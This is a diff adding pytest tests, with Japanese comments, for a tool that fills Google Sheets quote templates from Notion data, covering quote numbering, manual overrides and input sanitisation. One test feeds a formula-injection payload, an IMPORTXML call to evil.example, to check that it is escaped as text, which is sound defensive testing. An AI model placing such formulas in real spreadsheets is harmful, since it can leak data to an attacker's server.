@@ -11,6 +11,7 @@ from src.document_generation.quote_generator import (
     DuplicateApprovalRequestError,
     InvalidApproverEmailError,
     QUOTE_PENDING_APPROVAL_FOLDER_ID,
+    QuoteOverrides,
     generate_quote,
     request_quote_approval,
 )
@@ -26,6 +27,14 @@ from tests.document_generation._fakes import (
 
 PAGE_ID = "abcd1234-0000-0000-0000-000000000000"
 SHEET_NAME = "案件Aタブ"
+
+
+@pytest.fixture(autouse=True)
+def _default_quote_sequence(monkeypatch: pytest.MonkeyPatch) -> None:
+    """見積書NOの当日発行連番はPostgresへ実際に問い合わせる(`quote_number_db.
+    next_sequence_for_date`)ため、DB接続の無いテスト環境では既定で固定値(1)を返す
+    フェイクに差し替えておく。連番の値そのものを検証したいテストは個別に上書きする。"""
+    monkeypatch.setattr("src.document_generation.quote_generator.next_sequence_for_date", lambda date_prefix: 1)
 
 
 def test_generate_quote_copies_fills_exports_and_deletes(monkeypatch: pytest.MonkeyPatch) -> None:
@@ -64,7 +73,9 @@ def test_generate_quote_copies_fills_exports_and_deletes(monkeypatch: pytest.Mon
     assert drive_client.deleted_ids == ["copy-123"]
 
     assert sheets_client.updates[f"'{SHEET_NAME}'!H1"] == "2026/08/07"
-    assert sheets_client.updates[f"'{SHEET_NAME}'!H2"] == "CN20260807ABCD"
+    # 見積書NOは正式ルール: CN{YYYYMMDD}{作成者頭文字1字}{当日発行連番2桁}。作成者は
+    # 案件データ(担当メンバー)の"金沢"、連番はフィクスチャで固定した1。
+    assert sheets_client.updates[f"'{SHEET_NAME}'!H2"] == "CN20260807金01"
     assert sheets_client.updates[f"'{SHEET_NAME}'!A3"] == "テスト商店　御中"
     assert sheets_client.updates[f"'{SHEET_NAME}'!D4"] == "テスト案件"
     # Drive APIのexportはワークブック全体を書き出してしまうため、対象タブ以外を削除して
@@ -180,6 +191,138 @@ def test_generate_quote_adds_note_when_client_name_missing() -> None:
     )
 
     assert any("取引先名" in note for note in result.notes)
+
+
+def test_generate_quote_applies_overrides_over_notion_data(monkeypatch: pytest.MonkeyPatch) -> None:
+    """手動入力欄(overrides)はNotion案件データより優先される。商材名・初期費用・月額費用は
+    Notion側に対応項目が無いため、overridesからのみ差し込まれる。"""
+    monkeypatch.setattr("src.document_generation.quote_generator._today_jst", lambda: date(2026, 8, 19))
+    monkeypatch.setattr(
+        "src.document_generation.quote_generator.next_sequence_for_date", lambda date_prefix: 3
+    )
+    raw_page = build_raw_project_page(page_id=PAGE_ID, proposed_services=["リピッテ"], memo="元のメモ")
+    template = TemplateInfo(file_id="TEMPLATE_ID", file_name="リピッテホテル_見積書.xlsx", mime_type_hint=None)
+    registry = FakeTemplateRegistry({("見積書", "リピッテホテル"): template})
+    drive_client = FakeGoogleDriveDocClient()
+    rows = [
+        ["", "", "", "", "", "見積書NO：", "", "", "", ""],
+        ["", "", "", "", "", "担当：", "", "", "", ""],
+        ["", "", "", "", "", "注意事項：", "", "", "", ""],
+        ["", "", "", "", "", "商材名：", "", "", "", ""],
+        ["", "", "", "", "", "初期費用：", "", "", "", ""],
+        ["", "", "", "", "", "月額費用：", "", "", "", ""],
+        ["〇〇　御中", "", "", "", "", "", "", "", "", ""],
+    ]
+    sheets_client = FakeSheetsClient(rows, sheet_title=SHEET_NAME)
+
+    overrides = QuoteOverrides(
+        memo="上書きメモ",
+        client_name="上書き商店",
+        service_name="ホテマ",
+        initial_fee="100,000円",
+        monthly_fee="30,000円",
+        creator_name="Kanazawa",
+    )
+    generate_quote(
+        PAGE_ID,
+        registry=registry,
+        drive_client=drive_client,
+        sheets_client=sheets_client,
+        notion_client=FakeProjectNotionClient(raw_page),
+        client_master_client=FakeClientMasterClient("テスト商店"),
+        overrides=overrides,
+    )
+
+    # ラベル右隣に既存値が無いため、書き込み先はラベル列(F=index5)の次列G(index6)になる
+    # （`sheet_filler._find_target_column`のフォールバック仕様）。
+    # 作成者頭文字は overrides.creator_name の先頭1文字("K")、連番はmonkeypatchした3。
+    assert sheets_client.updates[f"'{SHEET_NAME}'!G1"] == "CN20260819K03"
+    assert sheets_client.updates[f"'{SHEET_NAME}'!G2"] == "Kanazawa"
+    assert sheets_client.updates[f"'{SHEET_NAME}'!G3"] == "上書きメモ"
+    assert sheets_client.updates[f"'{SHEET_NAME}'!G4"] == "ホテマ"
+    assert sheets_client.updates[f"'{SHEET_NAME}'!G5"] == "100,000円"
+    assert sheets_client.updates[f"'{SHEET_NAME}'!G6"] == "30,000円"
+    # 宛先セルもoverrides.client_name（Notionの"テスト商店"ではなく）が使われる。
+    assert sheets_client.updates[f"'{SHEET_NAME}'!A7"] == "上書き商店　御中"
+
+
+def test_generate_quote_blank_override_falls_back_to_notion_value(monkeypatch: pytest.MonkeyPatch) -> None:
+    """空文字列のoverrideは「未入力」として扱われ、Notion案件データの値が使われる。"""
+    monkeypatch.setattr("src.document_generation.quote_generator._today_jst", lambda: date(2026, 8, 19))
+    raw_page = build_raw_project_page(page_id=PAGE_ID, proposed_services=["リピッテ"], memo="元のメモ")
+    template = TemplateInfo(file_id="TEMPLATE_ID", file_name="リピッテホテル_見積書.xlsx", mime_type_hint=None)
+    registry = FakeTemplateRegistry({("見積書", "リピッテホテル"): template})
+    drive_client = FakeGoogleDriveDocClient()
+    rows = [["", "", "", "", "", "注意事項：", "", "", "", ""]]
+    sheets_client = FakeSheetsClient(rows, sheet_title=SHEET_NAME)
+
+    generate_quote(
+        PAGE_ID,
+        registry=registry,
+        drive_client=drive_client,
+        sheets_client=sheets_client,
+        notion_client=FakeProjectNotionClient(raw_page),
+        client_master_client=FakeClientMasterClient("テスト商店"),
+        overrides=QuoteOverrides(memo="   "),
+    )
+
+    assert sheets_client.updates[f"'{SHEET_NAME}'!G1"] == "元のメモ"
+
+
+def test_generate_quote_sanitizes_override_values_starting_with_formula_trigger_chars(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """手動入力欄の値がGoogle Sheetsの数式として評価されないよう、`=`/`+`/`-`/`@`始まりの
+    値には`'`を前置してテキストとして強制する（shirokuma-secレビューWARN対応、
+    formula injection対策）。"""
+    monkeypatch.setattr("src.document_generation.quote_generator._today_jst", lambda: date(2026, 8, 19))
+    raw_page = build_raw_project_page(page_id=PAGE_ID, proposed_services=["リピッテ"])
+    template = TemplateInfo(file_id="TEMPLATE_ID", file_name="リピッテホテル_見積書.xlsx", mime_type_hint=None)
+    registry = FakeTemplateRegistry({("見積書", "リピッテホテル"): template})
+    drive_client = FakeGoogleDriveDocClient()
+    rows = [
+        ["", "", "", "", "", "初期費用：", "", "", "", ""],
+        ["〇〇　御中", "", "", "", "", "", "", "", "", ""],
+    ]
+    sheets_client = FakeSheetsClient(rows, sheet_title=SHEET_NAME)
+
+    generate_quote(
+        PAGE_ID,
+        registry=registry,
+        drive_client=drive_client,
+        sheets_client=sheets_client,
+        notion_client=FakeProjectNotionClient(raw_page),
+        client_master_client=FakeClientMasterClient(),
+        overrides=QuoteOverrides(
+            initial_fee='=IMPORTXML("http://evil.example/", "//a")',
+            client_name="+81-invoice",
+        ),
+    )
+
+    assert sheets_client.updates[f"'{SHEET_NAME}'!G1"] == "'=IMPORTXML(\"http://evil.example/\", \"//a\")"
+    assert sheets_client.updates[f"'{SHEET_NAME}'!A2"] == "'+81-invoice　御中"
+
+
+def test_generate_quote_adds_note_when_creator_name_unresolved(monkeypatch: pytest.MonkeyPatch) -> None:
+    """作成者がNotion案件データにも手動入力欄にも無く見積書NOが"X"採番になった場合、
+    理由を送付前確認欄(notes)に明示する（obasan-qualityレビューWARN対応）。"""
+    monkeypatch.setattr("src.document_generation.quote_generator._today_jst", lambda: date(2026, 8, 19))
+    raw_page = build_raw_project_page(page_id=PAGE_ID, proposed_services=["リピッテ"], assignee_name=None)
+    template = TemplateInfo(file_id="TEMPLATE_ID", file_name="リピッテホテル_見積書.xlsx", mime_type_hint=None)
+    registry = FakeTemplateRegistry({("見積書", "リピッテホテル"): template})
+    drive_client = FakeGoogleDriveDocClient()
+    sheets_client = FakeSheetsClient([], sheet_title=SHEET_NAME)
+
+    result = generate_quote(
+        PAGE_ID,
+        registry=registry,
+        drive_client=drive_client,
+        sheets_client=sheets_client,
+        notion_client=FakeProjectNotionClient(raw_page),
+        client_master_client=FakeClientMasterClient(),
+    )
+
+    assert any("仮の「X」で採番" in note for note in result.notes)
 
 
 # --- request_quote_approval (見積書 承認フロー、2026-08-18) ----------------------------------
